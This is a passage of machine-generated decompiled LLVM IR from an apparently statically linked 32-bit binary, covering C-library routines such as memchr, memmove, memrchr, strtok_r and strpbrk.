  store i32 %v10_8061cb2, i32* %edx.global-to-local, align 4
  %v1_8061cb6 = add i32 %v0_8061cb2, 40
  %v2_8061cb6 = inttoptr i32 %v1_8061cb6 to i32*
  store i32 0, i32* %v2_8061cb6, align 4
  %v0_8061cbd = load i32, i32* %edx.global-to-local, align 4
  %v1_8061cbd = urem i32 %v0_8061cbd, 256
  store i32 %v1_8061cbd, i32* @edx, align 4
  br label %dec_label_pc_8061d39

dec_label_pc_8061cc2:                             ; preds = %dec_label_pc_8061c9f
  %v1_8061cc2 = add i32 %v2_8061cd3, 16
  %v2_8061cc2 = inttoptr i32 %v1_8061cc2 to i32*
  %v3_8061cc2 = load i32, i32* %v2_8061cc2, align 4
  %v1_8061cc5 = add i32 %v2_8061cd3, 20
  %v2_8061cc5 = inttoptr i32 %v1_8061cc5 to i32*
  %v3_8061cc5 = load i32, i32* %v2_8061cc5, align 4
  %v15_8061cc5 = icmp eq i32 %v3_8061cc5, %v3_8061cc2
  %v1_8061cc8 = icmp eq i1 %v15_8061cc5, false
  br i1 %v1_8061cc8, label %dec_label_pc_8061d11, label %dec_label_pc_8061cca

dec_label_pc_8061cca:                             ; preds = %dec_label_pc_8061cc2
  %v1_8061cca = add i32 %v2_8061cd3, 4
  %v2_8061cca = inttoptr i32 %v1_8061cca to i32*
  %v3_8061cca = load i32, i32* %v2_8061cca, align 4
  %v13_8061cca = icmp eq i32 %v3_8061cca, -2
  %v1_8061cce = icmp eq i1 %v13_8061cca, false
  br i1 %v1_8061cce, label %dec_label_pc_8061cd8, label %dec_label_pc_8061cd0

dec_label_pc_8061cd0:                             ; preds = %dec_label_pc_8061cca
  %v1_8061cd0 = or i32 %v2_8061c9f, 4
  store i32 %v1_8061cd0, i32* @ecx, align 4
  %v1_8061cd3 = trunc i32 %v1_8061cd0 to i16
  %v3_8061cd3 = inttoptr i32 %v2_8061cd3 to i16*
  store i16 %v1_8061cd3, i16* %v3_8061cd3, align 2
  br label %dec_label_pc_8061d36

dec_label_pc_8061cd8:                             ; preds = %dec_label_pc_8061cca
  %v1_8061cd8 = udiv i32 %v2_8061c9f, 256
  %v2_8061cd8 = trunc i32 %v1_8061cd8 to i8
  %v3_8061cd8 = urem i8 %v2_8061cd8, 4
  %v4_8061cd8 = icmp eq i8 %v3_8061cd8, 0
  %v8_8061cd8 = zext i8 %v3_8061cd8 to i32
  %v10_8061cd8 = mul nuw nsw i32 %v8_8061cd8, 256
  %v11_8061cd8 = urem i32 %v2_8061c9f, 256
  %v12_8061cd8 = or i32 %v10_8061cd8, %v11_8061cd8
  store i32 %v12_8061cd8, i32* %edx.global-to-local, align 4
  br i1 %v4_8061cd8, label %dec_label_pc_8061ced, label %dec_label_pc_8061cdd

dec_label_pc_8061cdd:                             ; preds = %dec_label_pc_8061cd8
  %v3_8061ce5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_807461c.665 to i16*))
  %v0_8061ced.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061ced

dec_label_pc_8061ced:                             ; preds = %dec_label_pc_8061cd8, %dec_label_pc_8061cdd
  %v0_8061d22 = phi i32 [ %v2_8061cd3, %dec_label_pc_8061cd8 ], [ %v0_8061ced.pre, %dec_label_pc_8061cdd ]
  %v1_8061ced = add i32 %v0_8061d22, 8
  %v2_8061ced = inttoptr i32 %v1_8061ced to i32*
  %v3_8061ced = load i32, i32* %v2_8061ced, align 4
  %v1_8061cf0 = add i32 %v0_8061d22, 12
  %v2_8061cf0 = inttoptr i32 %v1_8061cf0 to i32*
  %v3_8061cf0 = load i32, i32* %v2_8061cf0, align 4
  %v15_8061cf0 = icmp eq i32 %v3_8061cf0, %v3_8061ced
  br i1 %v15_8061cf0, label %dec_label_pc_8061d1a, label %dec_label_pc_8061cf5

dec_label_pc_8061cf5:                             ; preds = %dec_label_pc_8061ced
  %v2_8061cf8 = add i32 %v0_8061d22, 24
  %v3_8061cf8 = inttoptr i32 %v2_8061cf8 to i32*
  store i32 %v3_8061ced, i32* %v3_8061cf8, align 4
  %v0_8061cfb = load i32, i32* @ebx, align 4
  %v2_8061cfc = call i32 @__stdio_rfill(i32 %v0_8061cfb)
  %v1_8061d04 = icmp eq i32 %v2_8061cfc, 0
  br i1 %v1_8061d04, label %dec_label_pc_8061d36, label %dec_label_pc_8061d08

dec_label_pc_8061d08:                             ; preds = %dec_label_pc_8061cf5
  %v0_8061d08 = load i32, i32* @ebx, align 4
  %v1_8061d08 = add i32 %v0_8061d08, 20
  %v2_8061d08 = inttoptr i32 %v1_8061d08 to i32*
  %v3_8061d08 = load i32, i32* %v2_8061d08, align 4
  %v2_8061d0b = add i32 %v0_8061d08, 24
  %v3_8061d0b = inttoptr i32 %v2_8061d0b to i32*
  store i32 %v3_8061d08, i32* %v3_8061d0b, align 4
  %v0_8061d0e = load i32, i32* @ebx, align 4
  %v1_8061d0e = add i32 %v0_8061d0e, 16
  %v2_8061d0e = inttoptr i32 %v1_8061d0e to i32*
  %v3_8061d0e = load i32, i32* %v2_8061d0e, align 4
  br label %dec_label_pc_8061d11

dec_label_pc_8061d11:                             ; preds = %dec_label_pc_8061cc2, %entry, %dec_label_pc_8061d08
  %v1_8061d15 = phi i32 [ %v2_8061cd3, %dec_label_pc_8061cc2 ], [ %v4_8061c68, %entry ], [ %v0_8061d0e, %dec_label_pc_8061d08 ]
  %v0_8061d11 = phi i32 [ %v3_8061cc2, %dec_label_pc_8061cc2 ], [ %v3_8061c6c, %entry ], [ %v3_8061d0e, %dec_label_pc_8061d08 ]
  %v1_8061d11 = inttoptr i32 %v0_8061d11 to i8*
  %v2_8061d11 = load i8, i8* %v1_8061d11, align 1
  %v3_8061d11 = zext i8 %v2_8061d11 to i32
  store i32 %v3_8061d11, i32* @edx, align 4
  %v1_8061d14 = add i32 %v0_8061d11, 1
  %v2_8061d15 = add i32 %v1_8061d15, 16
  %v3_8061d15 = inttoptr i32 %v2_8061d15 to i32*
  store i32 %v1_8061d14, i32* %v3_8061d15, align 4
  %v0_8061d39.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8061d39

dec_label_pc_8061d1a:                             ; preds = %dec_label_pc_8061ced
  %v2_8061d1d = ptrtoint i8* %stack_var_-5 to i32
  %v5_8061d22 = inttoptr i32 %v0_8061d22 to i16*
  %v5_8061d23 = call i32 @__stdio_READ(i16* %v5_8061d22, i32 %v2_8061d1d, i32 1)
  %v1_8061d2b = icmp eq i32 %v5_8061d23, 0
  br i1 %v1_8061d2b, label %dec_label_pc_8061d36, label %dec_label_pc_8061d2f

dec_label_pc_8061d2f:                             ; preds = %dec_label_pc_8061d1a
  %v3_8061d2f = load i8, i8* %stack_var_-5, align 1
  %v4_8061d2f = sext i8 %v3_8061d2f to i32
  store i32 %v4_8061d2f, i32* @edx, align 4
  br label %dec_label_pc_8061d39

dec_label_pc_8061d36:                             ; preds = %dec_label_pc_8061d1a, %dec_label_pc_8061cf5, %dec_label_pc_8061c87, %dec_label_pc_8061cd0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8061d39

dec_label_pc_8061d39:                             ; preds = %dec_label_pc_8061d2f, %dec_label_pc_8061d11, %dec_label_pc_8061ca9, %dec_label_pc_8061d36
  %v0_8061d39 = phi i32 [ %v4_8061d2f, %dec_label_pc_8061d2f ], [ %v0_8061d39.pre, %dec_label_pc_8061d11 ], [ %v1_8061cbd, %dec_label_pc_8061ca9 ], [ -1, %dec_label_pc_8061d36 ]
  store i32 %v0_8061c64, i32* @ebx, align 4
  ret i32 %v0_8061d39

; uselistorder directives
  uselistorder i32 %v0_8061d11, { 1, 0 }
  uselistorder i32 %v3_8061ced, { 1, 0 }
  uselistorder i32 %v0_8061d22, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8061cd8, { 1, 0 }
  uselistorder i32 %v3_8061cc2, { 1, 0 }
  uselistorder i32 %v1_8061cbd, { 1, 0 }
  uselistorder i32 %v2_8061c9f, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8061cd3, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 65535, { 0, 4, 1, 5, 7, 6, 2, 3 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8061d39, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8061d36, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8061d11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061ced, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8061d40 = load i32, i32* @edi, align 4
  store i32 %v0_8061d40, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8061d47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8061d47, i32* %edi.global-to-local, align 4
  %v1_8061d4f = icmp eq i32 %arg3, 0
  store i1 %v1_8061d4f, i1* %zf.global-to-local, align 1
  br i1 %v1_8061d4f, label %dec_label_pc_8061d5f, label %dec_label_pc_8061d53

dec_label_pc_8061d53:                             ; preds = %entry
  %v2_8061d53 = call i32 @_strlen(i8* %arg1)
  %v3_8061d53 = mul i32 %v2_8061d53, -1
  %v4_8061d53 = add i32 %v3_8061d53, -2
  store i32 %v4_8061d53, i32* @ecx, align 4
  %v0_8061d55 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8061d55, label %dec_label_pc_8061d53.dec_label_pc_8061d5c_crit_edge, label %dec_label_pc_8061d57

dec_label_pc_8061d53.dec_label_pc_8061d5c_crit_edge: ; preds = %dec_label_pc_8061d53
  %v0_8061d5c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8061d5c.pre, -1
  br label %dec_label_pc_8061d5c

dec_label_pc_8061d57:                             ; preds = %dec_label_pc_8061d53
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061d5c

dec_label_pc_8061d5c:                             ; preds = %dec_label_pc_8061d53.dec_label_pc_8061d5c_crit_edge, %dec_label_pc_8061d57
  %v0_8061d5c = phi i32 [ %phitmp, %dec_label_pc_8061d53.dec_label_pc_8061d5c_crit_edge ], [ 0, %dec_label_pc_8061d57 ]
  %v8_8061d5c = icmp eq i32 %v0_8061d5c, 0
  store i1 %v8_8061d5c, i1* %zf.global-to-local, align 1
  store i32 %v0_8061d5c, i32* %edi.global-to-local, align 4
  %v2_8061d61.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8061d5f

dec_label_pc_8061d5f:                             ; preds = %entry, %dec_label_pc_8061d5c
  %v2_8061d61 = phi i32 [ %v0_8061d40, %entry ], [ %v2_8061d61.pre, %dec_label_pc_8061d5c ]
  %v0_8061d5f = phi i32 [ 0, %entry ], [ %v0_8061d5c, %dec_label_pc_8061d5c ]
  store i32 %v2_8061d61, i32* @edi, align 4
  ret i32 %v0_8061d5f

; uselistorder directives
  uselistorder i32 %v0_8061d5c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8061d5f, { 1, 0 }
  uselistorder label %dec_label_pc_8061d5c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8061d65 = load i32, i32* @esi, align 4
  store i32 %v0_8061d65, i32* %stack_var_-8, align 4
  %v4_8061d66 = ptrtoint i8* %arg1 to i32
  %v9_8061d72 = icmp ugt i8* %tmp3, %arg1
  %v1_8061d74 = icmp eq i1 %v9_8061d72, false
  br i1 %v1_8061d74, label %dec_label_pc_8061d7c, label %dec_label_pc_8061d76

dec_label_pc_8061d76:                             ; preds = %entry
  %v7_8061d78 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8061d78 = ptrtoint i8* %v7_8061d78 to i32
  store i32 %v8_8061d78, i32* @ecx, align 4
  br label %dec_label_pc_8061d88

dec_label_pc_8061d7c:                             ; preds = %entry
  %v3_8061d7c = add i32 %arg2, -1
  %v4_8061d7c = add i32 %v3_8061d7c, %tmp
  %v5_8061d7c = inttoptr i32 %v4_8061d7c to i8*
  %v3_8061d80 = add i32 %v4_8061d66, -1
  %v4_8061d80 = add i32 %v3_8061d80, %tmp
  %v5_8061d80 = inttoptr i32 %v4_8061d80 to i8*
  %v7_8061d85 = call i8* @_memcpy(i8* %v5_8061d80, i8* %v5_8061d7c, i32 %tmp)
  %v8_8061d85 = ptrtoint i8* %v7_8061d85 to i32
  store i32 %v8_8061d85, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8061d88

dec_label_pc_8061d88:                             ; preds = %dec_label_pc_8061d76, %dec_label_pc_8061d7c
  %v2_8061d88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8061d88, i32* @esi, align 4
  ret i32 %v4_8061d66

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061d88, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8061d8c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8061d9f = inttoptr i32 %arg1 to i16*
  %v4_8061d9f = call i32 @memcpy(i16* %v3_8061d9f, i32 %arg2, i32 %arg3)
  %v0_8061da4 = load i32, i32* @esi, align 4
  %v2_8061da4 = add i32 %v0_8061da4, %arg3
  store i32 %v0_8061d8c, i32* @esi, align 4
  ret i32 %v2_8061da4
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8061db5 = urem i32 %arg2, 256
  %v4_8061dc1 = sext i8 %arg1 to i32
  %v2_8061dc5 = add i32 %v4_8061dc1, %arg3
  %v1_8061dd77 = icmp eq i32 %arg3, 0
  br i1 %v1_8061dd77, label %dec_label_pc_8061ddf, label %dec_label_pc_8061ddb

dec_label_pc_8061dc9:                             ; preds = %dec_label_pc_8061ddb
  %v1_8061dc9 = add i32 %v0_8061dc9, -1
  %v5_8061dca = load i32, i32* @edx, align 4
  %v6_8061dca = and i32 %v5_8061dca, -256
  %v7_8061dca = or i32 %v6_8061dca, %v4_8061db5
  store i32 %v7_8061dca, i32* @edx, align 4
  %v1_8061dce = inttoptr i32 %v1_8061dc9 to i8*
  %v2_8061dce = load i8, i8* %v1_8061dce, align 1
  %v15_8061dce = icmp eq i8 %v2_8061dce, %tmp
  br i1 %v15_8061dce, label %dec_label_pc_8061e5c, label %dec_label_pc_8061dd6

dec_label_pc_8061dd6:                             ; preds = %dec_label_pc_8061dc9
  %v1_8061dd6 = add i32 %v0_8061dd6, -1
  %v8_8061dd6 = icmp eq i32 %v1_8061dd6, 0
  br i1 %v8_8061dd6, label %dec_label_pc_8061ddf, label %dec_label_pc_8061ddb

dec_label_pc_8061ddb:                             ; preds = %entry, %dec_label_pc_8061dd6
  %v0_8061dd6 = phi i32 [ %v1_8061dd6, %dec_label_pc_8061dd6 ], [ %arg3, %entry ]
  %v0_8061dc9 = phi i32 [ %v1_8061dc9, %dec_label_pc_8061dd6 ], [ %v2_8061dc5, %entry ]
  %v2_8061ddb = urem i32 %v0_8061dc9, 4
  %v3_8061ddb = icmp eq i32 %v2_8061ddb, 0
  %v1_8061ddd = icmp eq i1 %v3_8061ddb, false
  br i1 %v1_8061ddd, label %dec_label_pc_8061dc9, label %dec_label_pc_8061ddf

dec_label_pc_8061ddf:                             ; preds = %dec_label_pc_8061dd6, %dec_label_pc_8061ddb, %entry
  %v0_8061e42.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8061dd6 ], [ %v0_8061dd6, %dec_label_pc_8061ddb ]
  %v0_8061de4 = phi i32 [ %v2_8061dc5, %entry ], [ %v1_8061dc9, %dec_label_pc_8061dd6 ], [ %v0_8061dc9, %dec_label_pc_8061ddb ]
  store i32 %v0_8061de4, i32* @ecx, align 4
  %v2_8061de8 = mul nuw nsw i32 %v4_8061db5, 256
  %v2_8061deb = or i32 %v2_8061de8, %v4_8061db5
  %v2_8061def = mul i32 %v2_8061deb, 65536
  %v2_8061df2 = or i32 %v2_8061def, %v2_8061deb
  %v6_8061e4553 = icmp ugt i32 %v0_8061e42.pr, 3
  br i1 %v6_8061e4553, label %dec_label_pc_8061df6, label %dec_label_pc_8061e47

dec_label_pc_8061df6:                             ; preds = %dec_label_pc_8061ddf, %dec_label_pc_8061e3f
  %v0_8061e3f55 = phi i32 [ %v1_8061e3f, %dec_label_pc_8061e3f ], [ %v0_8061e42.pr, %dec_label_pc_8061ddf ]
  %v0_8061df654 = phi i32 [ %v1_8061df6, %dec_label_pc_8061e3f ], [ %v0_8061de4, %dec_label_pc_8061ddf ]
  %v1_8061df6 = add i32 %v0_8061df654, -4
  store i32 %v1_8061df6, i32* @ecx, align 4
  %v2_8061dfb = inttoptr i32 %v1_8061df6 to i32*
  %v3_8061dfb = load i32, i32* %v2_8061dfb, align 4
  %v4_8061dfb = xor i32 %v3_8061dfb, %v2_8061df2
  %v1_8061dfd = add i32 %v4_8061dfb, 2130640639
  %v1_8061e03 = sub i32 -1, %v4_8061dfb
  %v2_8061e05 = xor i32 %v1_8061dfd, %v1_8061e03
  %v1_8061e07 = and i32 %v2_8061e05, -2130640640
  %v2_8061e07 = icmp eq i32 %v1_8061e07, 0
  br i1 %v2_8061e07, label %dec_label_pc_8061e3f, label %dec_label_pc_8061e0f

dec_label_pc_8061e0f:                             ; preds = %dec_label_pc_8061df6
  %v7_8061e0f = or i32 %v1_8061e07, %v4_8061db5
  %v1_8061e13 = add i32 %v0_8061df654, -1
  %v2_8061e16 = inttoptr i32 %v1_8061e13 to i8*
  %v3_8061e16 = load i8, i8* %v2_8061e16, align 1
  %v16_8061e16 = icmp eq i8 %v3_8061e16, %tmp
  br i1 %v16_8061e16, label %dec_label_pc_8061e5c, label %dec_label_pc_8061e1b

dec_label_pc_8061e1b:                             ; preds = %dec_label_pc_8061e0f
  %v1_8061e1f = add i32 %v0_8061df654, -2
  %v2_8061e22 = inttoptr i32 %v1_8061e1f to i8*
  %v3_8061e22 = load i8, i8* %v2_8061e22, align 1
  %v16_8061e22 = icmp eq i8 %v3_8061e22, %tmp
  br i1 %v16_8061e22, label %dec_label_pc_8061e5c, label %dec_label_pc_8061e27

dec_label_pc_8061e27:                             ; preds = %dec_label_pc_8061e1b
  %v1_8061e2b = add i32 %v0_8061df654, -3
  %v2_8061e2e = inttoptr i32 %v1_8061e2b to i8*
  %v3_8061e2e = load i8, i8* %v2_8061e2e, align 1
  %v16_8061e2e = icmp eq i8 %v3_8061e2e, %tmp
  br i1 %v16_8061e2e, label %dec_label_pc_8061e5c, label %dec_label_pc_8061e33

dec_label_pc_8061e33:                             ; preds = %dec_label_pc_8061e27
  %v1_8061e37 = inttoptr i32 %v1_8061df6 to i8*
  %v2_8061e37 = load i8, i8* %v1_8061e37, align 1
  %v15_8061e37 = icmp eq i8 %v2_8061e37, %tmp
  %v1_8061e39 = icmp eq i1 %v15_8061e37, false
  br i1 %v1_8061e39, label %dec_label_pc_8061e3f, label %dec_label_pc_8061e3b

dec_label_pc_8061e3b:                             ; preds = %dec_label_pc_8061e33
  br label %dec_label_pc_8061e5c

dec_label_pc_8061e3f:                             ; preds = %dec_label_pc_8061e33, %dec_label_pc_8061df6
  %v5_8061e4c27 = phi i32 [ %v7_8061e0f, %dec_label_pc_8061e33 ], [ 0, %dec_label_pc_8061df6 ]
  %v1_8061e3f = add i32 %v0_8061e3f55, -4
  %v6_8061e45 = icmp ugt i32 %v1_8061e3f, 3
  br i1 %v6_8061e45, label %dec_label_pc_8061df6, label %dec_label_pc_8061e47

dec_label_pc_8061e47:                             ; preds = %dec_label_pc_8061e3f, %dec_label_pc_8061ddf
  %v5_8061e4c26.lcssa = phi i32 [ %v4_8061db5, %dec_label_pc_8061ddf ], [ %v5_8061e4c27, %dec_label_pc_8061e3f ]
  %v0_8061df6.lcssa = phi i32 [ %v0_8061de4, %dec_label_pc_8061ddf ], [ %v1_8061df6, %dec_label_pc_8061e3f ]
  %v0_8061e3f.lcssa = phi i32 [ %v0_8061e42.pr, %dec_label_pc_8061ddf ], [ %v1_8061e3f, %dec_label_pc_8061e3f ]
  br label %dec_label_pc_8061e54

dec_label_pc_8061e4b:                             ; preds = %dec_label_pc_8061e54
  %v1_8061e54 = add i32 %v0_8061e54, -1
  %v1_8061e4b = add i32 %v0_8061e4b, -1
  %v6_8061e4c = and i32 %v5_8061e4c, -256
  %v7_8061e4c = or i32 %v6_8061e4c, %v4_8061db5
  %v1_8061e50 = inttoptr i32 %v1_8061e4b to i8*
  %v2_8061e50 = load i8, i8* %v1_8061e50, align 1
  %v15_8061e50 = icmp eq i8 %v2_8061e50, %tmp
  br i1 %v15_8061e50, label %dec_label_pc_8061e5c, label %dec_label_pc_8061e54

dec_label_pc_8061e54:                             ; preds = %dec_label_pc_8061e4b, %dec_label_pc_8061e47
  %v5_8061e4c = phi i32 [ %v7_8061e4c, %dec_label_pc_8061e4b ], [ %v5_8061e4c26.lcssa, %dec_label_pc_8061e47 ]
  %v0_8061e4b = phi i32 [ %v1_8061e4b, %dec_label_pc_8061e4b ], [ %v0_8061df6.lcssa, %dec_label_pc_8061e47 ]
  %v0_8061e54 = phi i32 [ %v1_8061e54, %dec_label_pc_8061e4b ], [ %v0_8061e3f.lcssa, %dec_label_pc_8061e47 ]
  %v10_8061e55 = icmp eq i32 %v0_8061e54, 0
  %v1_8061e58 = icmp eq i1 %v10_8061e55, false
  br i1 %v1_8061e58, label %dec_label_pc_8061e4b, label %dec_label_pc_8061e5a

dec_label_pc_8061e5a:                             ; preds = %dec_label_pc_8061e54
  br label %dec_label_pc_8061e5c

dec_label_pc_8061e5c:                             ; preds = %dec_label_pc_8061dc9, %dec_label_pc_8061e27, %dec_label_pc_8061e1b, %dec_label_pc_8061e0f, %dec_label_pc_8061e4b, %dec_label_pc_8061e3b, %dec_label_pc_8061e5a
  %v0_8061e5f = phi i32 [ %v1_8061df6, %dec_label_pc_8061e3b ], [ 0, %dec_label_pc_8061e5a ], [ %v1_8061e4b, %dec_label_pc_8061e4b ], [ %v1_8061e2b, %dec_label_pc_8061e27 ], [ %v1_8061e1f, %dec_label_pc_8061e1b ], [ %v1_8061e13, %dec_label_pc_8061e0f ], [ %v1_8061dc9, %dec_label_pc_8061dc9 ]
  ret i32 %v0_8061e5f

; uselistorder directives
  uselistorder i32 %v0_8061e54, { 1, 0 }
  uselistorder i32 %v1_8061e3f, { 0, 2, 1 }
  uselistorder i32 %v1_8061df6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8061df654, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8061deb, { 1, 0 }
  uselistorder i32 %v0_8061dc9, { 1, 0, 2 }
  uselistorder i32 %v2_8061dc5, { 1, 0 }
  uselistorder i32 %v4_8061db5, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8061e5c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8061df6, { 1, 0 }
  uselistorder label %dec_label_pc_8061ddf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061ddb, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8061e60 = load i32, i32* @edi, align 4
  %v0_8061e61 = load i32, i32* @esi, align 4
  %v0_8061e62 = load i32, i32* @ebx, align 4
  store i32 %v0_8061e62, i32* %stack_var_-12, align 4
  %v4_8061e63 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8061e63, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8061e6f = icmp eq i8* %arg1, null
  %v1_8061e71 = icmp eq i1 %v1_8061e6f, false
  br i1 %v1_8061e71, label %dec_label_pc_8061e75, label %dec_label_pc_8061e73

dec_label_pc_8061e73:                             ; preds = %entry
  %v1_8061e73 = inttoptr i32 %arg3 to i32*
  %v2_8061e73 = load i32, i32* %v1_8061e73, align 4
  store i32 %v2_8061e73, i32* @ebx, align 4
  br label %dec_label_pc_8061e75

dec_label_pc_8061e75:                             ; preds = %entry, %dec_label_pc_8061e73
  %v0_8061e78 = phi i32 [ %v4_8061e63, %entry ], [ %v2_8061e73, %dec_label_pc_8061e73 ]
  %v0_8061e75 = load i32, i32* @ecx, align 4
  %v5_8061e78 = inttoptr i32 %v0_8061e78 to i8*
  %v8_8061e79 = call i32 @__GI_strspn(i8* %v5_8061e78, i32 %arg2, i32 %v0_8061e75, i32 %v0_8061e75)
  store i32 %v8_8061e79, i32* %eax.global-to-local, align 4
  %v0_8061e81 = load i32, i32* @ebx, align 4
  %v2_8061e81 = add i32 %v0_8061e81, %v8_8061e79
  store i32 %v2_8061e81, i32* @ebx, align 4
  %v1_8061e83 = inttoptr i32 %v2_8061e81 to i8*
  %v2_8061e83 = load i8, i8* %v1_8061e83, align 1
  %v3_8061e83 = icmp eq i8 %v2_8061e83, 0
  %v1_8061e86 = icmp eq i1 %v3_8061e83, false
  br i1 %v1_8061e86, label %dec_label_pc_8061e8e, label %dec_label_pc_8061e88

dec_label_pc_8061e88:                             ; preds = %dec_label_pc_8061e75
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8061e8a = load i32, i32* @esi, align 4
  %v2_8061e8a = inttoptr i32 %v1_8061e8a to i32*
  store i32 %v2_8061e81, i32* %v2_8061e8a, align 4
  %v0_8061eb8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061eb5

dec_label_pc_8061e8e:                             ; preds = %dec_label_pc_8061e75
  %v0_8061e90 = load i32, i32* @edi, align 4
  %v4_8061e92 = call i32 @__GI_strpbrk(i8* %v1_8061e83, i32 %v0_8061e90)
  store i32 %v4_8061e92, i32* %eax.global-to-local, align 4
  %v2_8061e9a = icmp eq i32 %v4_8061e92, 0
  %v1_8061e9c = icmp eq i1 %v2_8061e9a, false
  br i1 %v1_8061e9c, label %dec_label_pc_8061ead, label %dec_label_pc_8061e9e

dec_label_pc_8061e9e:                             ; preds = %dec_label_pc_8061e8e
  %v0_8061ea2 = load i32, i32* @ebx, align 4
  %v5_8061ea2 = inttoptr i32 %v0_8061ea2 to i8*
  %v8_8061ea3 = call i32 @rawmemchr(i8* %v5_8061ea2, i32 0, i32 %v4_8061e92, i32 %v4_8061e92)
  br label %dec_label_pc_8061eb1

dec_label_pc_8061ead:                             ; preds = %dec_label_pc_8061e8e
  %v5_8061e92 = inttoptr i32 %v4_8061e92 to i8*
  store i8 0, i8* %v5_8061e92, align 1
  %v2_8061eb0 = add i32 %v4_8061e92, 1
  br label %dec_label_pc_8061eb1

dec_label_pc_8061eb1:                             ; preds = %dec_label_pc_8061e9e, %dec_label_pc_8061ead
  %storemerge = phi i32 [ %v2_8061eb0, %dec_label_pc_8061ead ], [ %v8_8061ea3, %dec_label_pc_8061e9e ]
  %v0_8061eb1 = phi i32 [ %v2_8061eb0, %dec_label_pc_8061ead ], [ %v8_8061ea3, %dec_label_pc_8061e9e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8061eb1 = load i32, i32* @esi, align 4
  %v2_8061eb1 = inttoptr i32 %v1_8061eb1 to i32*
  store i32 %v0_8061eb1, i32* %v2_8061eb1, align 4
  %v0_8061eb3 = load i32, i32* @ebx, align 4
  store i32 %v0_8061eb3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061eb5

dec_label_pc_8061eb5:                             ; preds = %dec_label_pc_8061e88, %dec_label_pc_8061eb1
  %v0_8061eb8 = phi i32 [ %v0_8061eb8.pre, %dec_label_pc_8061e88 ], [ %v0_8061eb3, %dec_label_pc_8061eb1 ]
  %v2_8061eb5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061eb5, i32* @ebx, align 4
  store i32 %v0_8061e61, i32* @esi, align 4
  store i32 %v0_8061e60, i32* @edi, align 4
  ret i32 %v0_8061eb8

; uselistorder directives
  uselistorder i32 %v4_8061e92, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061eb5, { 1, 0 }
  uselistorder label %dec_label_pc_8061eb1, { 1, 0 }
  uselistorder label %dec_label_pc_8061e75, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8061ebd = load i32, i32* @ebx, align 4
  %v2_8061ed424 = load i8, i8* %arg1, align 1
  %v4_8061ed628 = icmp eq i8 %v2_8061ed424, 0
  br i1 %v4_8061ed628, label %dec_label_pc_8061ede, label %dec_label_pc_8061eda.lr.ph

dec_label_pc_8061eda.lr.ph:                       ; preds = %entry
  %v3_8061ed425 = zext i8 %v2_8061ed424 to i32
  %v5_8061ed426 = and i32 %v0_8061ebd, -256
